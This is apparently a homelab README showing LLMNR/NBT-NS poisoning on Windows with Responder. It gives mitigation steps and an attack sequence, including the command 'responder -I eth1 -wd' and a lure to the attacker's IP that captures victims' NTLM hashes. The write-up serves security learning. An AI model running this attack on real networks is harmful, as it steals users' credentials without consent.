<h1>LLMNP Poisoning</h1>
<b>
<h2>Description</h2>
This attack takes advantage of the way Windows systems perform name resolution. Impacket's Repsonder can intercept authentication requests to capture plaintext credentials or hashes.
<br />
 
<p align="center">
<h2>Utilities Used</h2>
 
- <b>Responder</b>
- <b>Hashcat</b>
- <b>VMware Workstation</b>
- <b>Security Onion</b>
- <b>Kali Linux</b>
- <b>Windows Server</b>
- <b>Ubuntu Server (as Splunk)</b>
- <b>Splunk Universal Forwarder</b>


<h2>Environments Used </h2>

- <b>Windows Server 2019</b>
- <b>Windows 10</b>
- <b>Linux</b>
<h2>Attack overview:</h2>

 - Mitigation</b>
   - Disabling LLMNR – LLMNR can be turned-off through
the group policy editor, under the “policy setting” menu under<br /> Local Computer Policy > Computer Configuration > Administrative Templates > Network > DNS Client.
   - Disabling NBT-NS – NBT-NS can be turned off through the Network Connection Settings. Navigate to Network Connections > Internet Protocol Version 4 > Properties > General > Advanced > WINS, then select “Disable NetBIOS over TCP/IP”.
<br />
<b>
 
 - Attack

 
You’ll need to install impacket for kali linux, you can find it here: <br />
[Impacket](https://github.com/fortra/impacket)<br />
<br /><br />


1. Identify the name of your NIC (usually eth0) by typing ifconfig. For me it was eth1
![image](https://github.com/AlexanderStroer/Cybersecurity-Homelab/assets/122342684/851ba128-52e2-4a1c-bc58-475fdd58ea28)<br />
1. Run Responder with the command <i> responder -I eth1 -wd </i>(ignorantly put, this will act almost like a DNS except it will wait the source to fail to resolve a destination upon which responder will falsely claim that it has the requested information and receive the traffic illegitimately)<br />
![image](https://github.com/AlexanderStroer/Cybersecurity-Homelab/assets/122342684/d8ee2913-92dc-4fde-83da-23b5d970338b)<br />
1. Now you'll need to wait for a user to make a mistake; alternatively I can feed that mistake by taking the network path straight to the attacker. Open up file explorer and type \\\ATTACK_MACHINES_IP_HERE<br /> <br />You'll see something like this appear on the victims side.<br />
![image](https://github.com/AlexanderStroer/Cybersecurity-Homelab/assets/122342684/8626effd-5e38-4573-bd08-9c67e9290afe)<br />
<br />And something like this on the attackers side. (I covered up some of the hash with that big box)<br />
![image](https://github.com/AlexanderStroer/Cybersecurity-Homelab/assets/122342684/611d9680-bafa-48fd-88d0-941d3a86b6d2)




</p>

<!--
 ```diff
- text in red
+ text in green
! text in orange
# text in gray
@@ text in purple (and bold)@@
```
--!>

